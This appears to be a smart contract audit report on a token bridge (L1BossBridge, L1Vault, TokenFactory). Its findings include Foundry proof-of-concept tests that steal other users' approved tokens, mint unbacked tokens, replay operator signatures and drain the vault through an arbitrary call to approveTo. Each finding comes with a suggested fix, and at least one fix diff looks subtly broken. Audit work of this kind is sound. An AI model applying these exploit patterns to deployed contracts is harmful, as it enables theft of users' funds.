### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assest stolen

The `depositTokensToL2` function allows anyone to call it with a `from` address of any account that has approved tokens to the bridge.

As a consequence, an attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, and assign them to the attacker's address in L2 (setting an attacker-controlled address in the `l2Recipient` parameter).

As a PoC, include the following test in the `L1BossBridge.t.sol` file:


``` solidity 
function testCanMoveApprovedTokensOfOtherUsers() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 depositAmount = token.balanceOf(user);
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attackerInL2, depositAmount);
    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), depositAmount);
    vm.stopPrank();
}
```


Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

``` diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```



### [H-2] Calling `depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked tokens

`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.

Additionally, they could mint all the tokens to themselves. 

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

``` solidity
function testCanTransferFromVaultToVault() public {
    vm.startPrank(attacker);

    // assume the vault already holds some tokens
    uint256 vaultBalance = 500 ether;
    deal(address(token), address(vault), vaultBalance);

    // Can trigger the `Deposit` event self-transferring tokens in the vault
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    // Any number of times
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(vault), address(vault), vaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);

    vm.stopPrank();
}
```

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.


### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

``` solidity 

    function testSignatureReplay() public {
        address attacker = makeAddr("attacker");

        uint256 valutInitialBalance = 1000e18;
        uint256 attackerBalance = 1000e18;

        deal(address(token), address(vault), valutInitialBalance);
        deal(address(token), address(attacker), attackerBalance);

        // deposit tokens into l2
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerBalance);

        // signer/operator is going to sign the withdraw
        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerBalance))); // encoding: address: token, 0, trasnferFrom( from: vault, to: attacker, attackerBalance)

        // bcs the operator put their signature on chain 1 time we can resuse it to withdraw all funds
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message))); // getting the v, r, s from the singing message 

        while(token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, attackerBalance, v, r, s);
        }

        assertEq(token.balanceOf(address(attacker)), attackerBalance + valutInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }

```

Consider redesigning the withdrawal mechanism so that it includes replay protection, e.i., adding nonce, deadline, or other parameters that would make each signature unique per tx.



### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

``` solidity 
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }

    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
}


```


The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

To reproduce, include the following test in the `L1BossBridge.t.sol` file:

``` solidity 
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    // An attacker deposits tokens to L2. We do this under the assumption that the
    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    // Under the assumption that the bridge operator doesn't validate bytes being signed
    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.



## [L-1] `TokenFactory::deployToken` can create multiple tokens with same symbol

### Impact: Malicious actors may use a potential duplicate token with matching symbols identical to established ones, potentially deceiving users and facilitating fraud, phishing, or trading errors.



### Proof of Code: 

``` solidity 
    mapping(string tokenSymobl => address[] tokenAddress) public s_tokenToAddress;

    function setUp() public {
        vm.prank(owner);
        tokenFactory = new TokenFactory();
    }

    function testMultipleSymbols() public {
        vm.startPrank(owner);

        // create first token 
        tokenFactory.deployToken("TEST", type(L1Token).creationCode);

        // create second token 
        tokenFactory.deployToken("TEST", type(L1Token).creationCode);
        
        vm.stopPrank();
    }
```

### Recommendation: 


``` diff

+    error TokenFactory__duplicateSymbol();
+    error TokenFactory__tokenCreationFailed();

    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        // if token already created it shouldn't have an address(0)
+       if (s_tokenToAddress[symbol] != address(0)) { revert TokenFactory__duplicateSymbol(); }

        assembly { 
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }

         // ensuring the creation of the new token is successful 
+        if (addr == address(0)) { revert TokenFactory__tokenCreationFailed(); }

        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }

```

<summary>Test the added fix</summary>

``` solidity 
    function testFix() public {
        vm.startPrank(owner);

        tokenFactory.deployToken("TEST", type(L1Token).creationCode);

        vm.expectRevert(TokenFactory.TokenFactory__duplicateSymbol.selector);
        tokenFactory.deployToken("TEST", type(L1Token).creationCode);
        vm.stopPrank();
    }
```
